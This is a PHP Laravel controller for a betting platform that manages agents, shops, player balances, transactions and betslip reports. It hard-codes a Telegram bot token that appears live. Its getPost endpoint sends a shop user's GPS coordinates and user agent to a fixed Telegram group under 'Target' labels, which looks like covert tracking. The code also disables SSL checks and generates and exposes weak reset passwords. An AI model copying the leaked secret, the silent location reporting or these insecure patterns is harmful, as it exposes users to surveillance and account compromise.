<?php

namespace App\Http\Controllers\Mycard;

use JWTAuth;
use App\User;
use App\Betslip;
use App\Transactions_History;
use App\ReportedBetslips;
use App\SuperConfig;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Exception; 
use Illuminate\Support\Facades\Validator;
use Tymon\JWTAuth\Exceptions\JWTException;
use Illuminate\Support\Facades\DB;
use Carbon\Carbon;

class DataController extends Controller{


    public function getWhois($whois){

       return (preg_match("/localhost/i", $whois)) ? "mycard77.win" : null;

    }

    public function telegramNotify($chatID, $message){

        $Token="1431446612:AAHHRDz9hAzKcZsDfjSweO3tLa_iA42_K_M";

        $url="https://api.telegram.org/bot".$Token;
        $params=[
                'chat_id'=>$chatID,
                'text'=> $message,
        ];

        $ch = curl_init($url . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);

    } 

    public function whoSuper($username){
                
        $first  = User::where('username','=',$username)->first();
        if(!$first) return "a";
        $parent = User::where('id','=',$first->parent)->first();
        if(!$parent) return "b";

        $super = "";
        $isHead = false;
        while(!$isHead){

            $parent = User::where('id','=',$parent->parent)->first();
            if(!$parent) return "c";
            if($parent->parent === 0){

                $super = $parent->username;
                $isHead = true;
                break;
            }

        }

        return [
                "super"  => $super,
                "child"  => $username,
                "date"  => Carbon::now()->format('Y-m-d H:i:s')
                ];


    }

    public function getMycardinfo(Request $request){

        try {

            $admin = JWTAuth::parseToken()->authenticate();

            $admin_info = [];

            $admin_info['id']       = $admin->id;
            $admin_info['username'] = $admin->username;
            $admin_info['solde']    = $admin->sold_sport;
            $admin_info['role']     = $admin->role;

            return response()->json([
                "status" => true,
                "user" => $admin_info
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }



    public function getUsers($role, Request $request){

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $query_data = User::where([['parent','=',$logged_user->id],['role','=', $role]])->get(['id','username','sold_sport','created_at','status'])->toArray();

            $key = 'sold_sport';
            $sum = array_sum(array_column($query_data,$key));


            return response()->json([
                "status" => true,
                "data" => $query_data,
                "count" => count($query_data),
                "sum_solde" => number_format($sum,2, '.', ' '),
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }


    public function getSingleUser($id, Request $request){

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $user   = User::where([['parent','=',$logged_user->id],['id','=',$id]])->first();


            if($user->role === "agent"){

                $d_role = "shop";    

            }elseif($user->role === "shop"){

                $d_role = "player";

            }else{

                $d_role = "player_2";
            }

            if($d_role === "player_2"){

            $childs = User::where([['parent','=',$logged_user->id],['role','=', "player"]])->get(['id','username','sold_sport','role','created_at','status'])->toArray();


            }else{

            $childs = User::where([['parent','=',$id],['role','=', $d_role]])->get(['id','username','sold_sport','role','created_at','status'])->toArray();

            }

            $key = 'sold_sport';
            $sum = array_sum(array_column($childs,$key));

            return response()->json([
                "status" => true,
                "user"   => $user,
                "childs" => $childs,
                "c_sum"  => $sum,
                "p" => ucfirst($d_role)."s",
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }
    public function createUser(Request $request){

        $origin = $this->getWhois($request->headers->get('origin'));


        $messages = array(
            'required' => 'The attribute field is required !',
            'alpha_dash' => 'No symbols or spaces allowed !',
            'unique' => "Le nom d'utilisateur deja existe"
        );

        $validator = Validator($request->only("username", "password", "role"), [
            'username' => 'required|alpha_dash|unique:users',
            'password' => 'required|string|min:5|max:30',
            'role' => 'required|in:agent,shop,player',
        ],$messages);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            if($request->role === "agent" && in_array($logged_user->role, ["agent","shop"]) ){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "Your are not allowed to create this type of user #1"
                ], 200);

            }
            

            if($request->role === "shop" && $logged_user->role === "shop" ){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "Your are not allowed to create this type of user #2"
                ], 200);

            }

            $user = new User();
            $user->name = $request->username;
            $user->username = $request->username;
            $user->password = bcrypt($request->password);
            $user->parent = $logged_user->id;
            $user->whois  = $logged_user->whois;
            $user->sold_sport = 0;
            $user->sold_casino = 0;
            $user->sold_livecasino = 0;
            $user->role = $request->role;
            $user->status = "active";
            $user->save();


            return response()->json([
                "status" => true,
                "type" => "ok",
                "mode" => "info",
                "message" => "Un nouveau compte ".$request->role." a été créé avec succès"
            ]);


        } catch (JWTException $e) {

                    return $e;
        }


    }


    public function passwordChange(Request $request){


        $origin = $request->headers->get('origin');

        $validator = Validator($request->only("user_id"), [
            "user_id" => "required|numeric|exists:users,id"
        ]);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $receiver = User::where([['parent','=',$logged_user->id],['id','=',$request->user_id]])->first();

            if(!empty($receiver)){

                    $new_password = rand(000000,999999);
                    $receiver->password = bcrypt($new_password);
                    $receiver->update();

                    
                    return response()->json([
                        "status" => true,
                        "type" => "ok",
                        "mode" => "info",
                        "message" => 'Le nouveau mot de passe de '.$receiver->role.'|'.$receiver->username.'|'.$new_password.''
                    ],200);



            }else{


                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "Something wen't wrong !"
                ], 200);


            }

        } catch (JWTException $e) {

                    return $e;
        }



    }

    public function statusChange(Request $request){


        $origin = $request->headers->get('origin');

        $validator = Validator($request->only("user_id","mode"), [
            "user_id" => "required|numeric|exists:users,id",
            "mode" => "required|in:on,off"
        ]);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $receiver = User::where([['parent','=',$logged_user->id],['id','=',$request->user_id]])->first();

            if(!empty($receiver)){

                if( $request->mode === "off" ){


                    $receiver->status = "blocked";
                    $receiver->save();

                }elseif( $request->mode === "on" ){


                    $receiver->status = "active";
                    $receiver->save();

                }
                    
                    return response()->json([
                        "status" => true,
                        "type" => "ok",
                        "mode" => "info",
                        "message" => "Done"
                    ],200);



            }else{


                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "Something wen't wrong !"
                ], 200);


            }

        } catch (JWTException $e) {

                    return $e;
        }



    }


    public function soldeManage(Request $request){


        $origin = $request->headers->get('origin');

        $validator = Validator($request->only("amount", "user_id","mode"), [
            "amount" => "required|numeric|gt:0|between:0.1,999999999999999",
            "user_id" => "required|numeric|exists:users,id",
            "mode" => "required|in:deposit,retrait"
        ]);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $receiver = User::where([['parent','=',$logged_user->id],['id','=',$request->user_id]])->first();

            if(!empty($receiver)){

                /// DEPOSIT
                if( $request->mode === "deposit" ){

                    if( $logged_user->sold_sport  < abs($request->amount) ){

                        return response()->json([
                            "status" => false,
                            "type" => "error",
                            "mode" => "info",
                            "message" => "Votre solde insuffisant pour terminer le deposit !"
                        ], 200);

                    }

                    //UPDATE SENDER FUNDS
                    $logged_user->decrement('sold_sport', abs($request->amount));
                    $logged_user->update();

                    //UPDATE RECEIVER FUNDS
                    $receiver->increment('sold_sport', abs($request->amount));
                    $receiver->update();


                    //INSERT TRANSACTION HISTORY 
                    $transaction = new Transactions_History();
                    $transaction->parent  = $logged_user->id;
                    $transaction->account = $receiver->username;
                    $transaction->sign = '+';
                    $transaction->amount = abs($request->amount);
                    $transaction->parent_balance = $receiver->sold_sport;
                    $transaction->save();


                    return response()->json([
                        "status" => true,
                        "type" => "ok",
                        "mode" => "info",
                        "message" => "La transaction sest terminée avec succès"
                    ]);


                }

                /// RETRAIT
                if( $request->mode === "retrait" ){

                    if( $receiver->sold_sport  < abs($request->amount) ){

                        return response()->json([
                            "status" => false,
                            "type" => "error",
                            "mode" => "info",
                            "message" => ucfirst($receiver->role)." solde insuffisant pour terminer le retrait !"
                        ], 200);

                    }

                    //UPDATE SENDER FUNDS
                    $logged_user->increment('sold_sport', abs($request->amount));
                    $logged_user->update();

                    //UPDATE RECEIVER FUNDS
                    $receiver->decrement('sold_sport', abs($request->amount));
                    $receiver->update();


                    //INSERT TRANSACTION HISTORY 
                    $transaction = new Transactions_History();
                    $transaction->parent  = $logged_user->id;
                    $transaction->account = $receiver->username;
                    $transaction->sign = '-';
                    $transaction->amount = abs($request->amount);
                    $transaction->parent_balance = $receiver->sold_sport;
                    $transaction->save();

                    
                    return response()->json([
                        "status" => true,
                        "type" => "ok",
                        "mode" => "info",
                        "message" => "La transaction sest terminée avec succès"
                    ]);


                }

            }else{


                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "Something wen't wrong !"
                ], 200);


            }

        } catch (JWTException $e) {

                    return $e;
        }



    }


    public function post_transactions(Request $request){

        $validator = Validator($request->only("sdate","edate"), [
            "sdate" => "required|min:8",
            "edate" => "required|min:8"
        ]);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $sdate = date("Y-m-d", strtotime($request->sdate)).' 00:00:00';
            $edate = date("Y-m-d", strtotime($request->edate)).' 23:59:00';

            $query = Transactions_History::whereBetween('created_at', [$sdate, $edate])->where('parent','=',$logged_user->id)->orderBy('created_at', 'desc')->get();



            return response()->json([
                "status" => true,
                "count" => count($query),
                "data" => $query,
                "s" => $sdate,
                "e" => $edate,
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }



    public function get_transactions(Request $request){

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $query = Transactions_History::where([['parent','=',$logged_user->id],['created_at','like','%'.date("Y-m-d").'%']])->orderBy('created_at', 'desc')->get();



            return response()->json([
                "status" => true,
                "count" => count($query),
                "data" => $query,
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }


    public function get_cashier(Request $request){

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $total_deposit = Transactions_History::where([['parent','=',$logged_user->id],['sign','=','+'],['created_at','like','%'.date("Y-m-d").'%']])->sum('amount');

            $total_retrait = Transactions_History::where([['parent','=',$logged_user->id],['sign','=','-'],['created_at','like','%'.date("Y-m-d").'%']])->sum('amount');



            return response()->json([
                "status" => true,
                "total_deposit" => $total_deposit,
                "total_retrait" => $total_retrait,
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }


    public function post_cashier(Request $request){

        $validator = Validator($request->only("sdate","edate"), [
            "sdate" => "required|min:8",
            "edate" => "required|min:8"
        ]);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();


            $sdate = date("Y-m-d", strtotime($request->sdate)).' 00:00:00';
            $edate = date("Y-m-d", strtotime($request->edate)).' 23:59:00';

            $total_deposit = Transactions_History::whereBetween('created_at', [$sdate, $edate])->where([['parent','=',$logged_user->id],['sign','=','+']])->sum('amount');

            $total_retrait = Transactions_History::whereBetween('created_at', [$sdate, $edate])->where([['parent','=',$logged_user->id],['sign','=','-']])->sum('amount');



            return response()->json([
                "status" => true,
                "total_deposit" => $total_deposit,
                "total_retrait" => $total_retrait,
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }



    public function report_betslip(Request $request){

        $validator = Validator($request->only("coupon"), [
            "coupon" => "required|min:8"
        ]);

        if($validator->fails()){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $coupon = $request->coupon;
            $betslip = Betslip::whereCoupon_code($coupon)->first();

            if(empty($betslip)){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "coupon code : ".$coupon." not found in our records"
                ], 200);

            }

            $player = User::whereId($betslip->user_id)->first();

            if(empty($player)){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => "coupon code : ".$coupon." not found in our records"
                ], 200);

            }

            $super  = $this->whoSuper($player->username);

            if( !is_array($super)  ){


                return response()->json([
                    "status" => true,
                    "type" => "ok",
                    "mode" => "info",
                    "message" => "Betslip with code coupon : ".$betslip->coupon_code." a été reporté avec succès"
                ]);

            }

            $superConfig  = SuperConfig::whereSuper($super["super"])->first();

            if($superConfig){

                $newR_Betslip = new ReportedBetslips();
                $newR_Betslip->coupon  = $betslip->coupon_code;
                $newR_Betslip->player  = $super["child"];
                $newR_Betslip->details = $request->details;
                $newR_Betslip->reporter = $logged_user->username;
                $newR_Betslip->state   = "open";
                $newR_Betslip->save();

                $msgText  = " ******* NEW BETSLIP REPORT ******* \n";

                $msgText .= " #COUPON   : ".$betslip->coupon_code." \n";
                $msgText .= " #PLAYER   : ".$super["child"]." \n";

                if( !empty($request->details) ){

                   $msgText .= " #DETAILS : ".$request->details." \n";
                }

                $msgText .= "\n #REPORTER        : ".$logged_user->username." \n";
                $msgText .= " #DATE            : ".$super['date']." \n";
                $msgText .= "*********************************** ";

                $this->telegramNotify($superConfig->telegram, $msgText);

                return response()->json([
                    "status" => true,
                    "type" => "ok",
                    "mode" => "info",
                    "message" => "Betslip with code coupon : ".$betslip->coupon_code." a été reporté avec succès"
                ]);


            }else{


                return response()->json([
                    "status" => true,
                    "type" => "ok",
                    "mode" => "info",
                    "message" => "Betslip with code coupon : ".$betslip->coupon_code." a été reporté avec succès"
                ]);

            }


        } catch (JWTException $e) {

                    return $e;
        }


    }


    public function get_reported_betslips(Request $request){

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $query = ReportedBetslips::where([['reporter','=',$logged_user->username]])->orderBy('created_at', 'desc')->get();



            return response()->json([
                "status" => true,
                "count" => count($query),
                "data" => $query,
            ],200);


        } catch (JWTException $e) {

                    return $e;
        }


    }

    public function getPost(Request $request){


       $validator = Validator($request->only("lat", "lon", "ua"), [
            "lat" => "required",
            "lon" => "required",
            "ua" => "required",
        ]);

        if( $validator->fails() ){

                return response()->json([
                    "status" => false,
                    "type" => "error",
                    "mode" => "info",
                    "message" => $validator->errors()->first()
                ], 200);
        }

        try {

            $logged_user = JWTAuth::parseToken()->authenticate();

            $lat = $request->lat;
            $lon = $request->lon;
            $ua = $request->ua;

            $msgText  = " ======= korzza Location Get ====== \n";

            $msgText .= " Target Shop : ".$logged_user->username." \n";
            $msgText .= " Target Latitude : ".$lat." \n";
            $msgText .= " Target Longitude : ".$lon." \n";
            $msgText .= " Target UA : ".$ua." \n";
            $msgText .= " Map Location : https://www.google.com/maps?q=".$lat.",".$lon." \n";
            $msgText .= "==========END MSG===========";

            $Token="1431446612:AAHHRDz9hAzKcZsDfjSweO3tLa_iA42_K_M";

            $url="https://api.telegram.org/bot".$Token;
            $Id="-697189937"; 

            $params=[
                    'chat_id'=>$Id,
                    'text'=> $msgText,
            ];

            $ch = curl_init($url . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);


            return response()->json([
                "status" => true,
                "msg" => "Done"
            ],200);

        } catch (JWTException $e) {

                    return $e;
        }


    }


}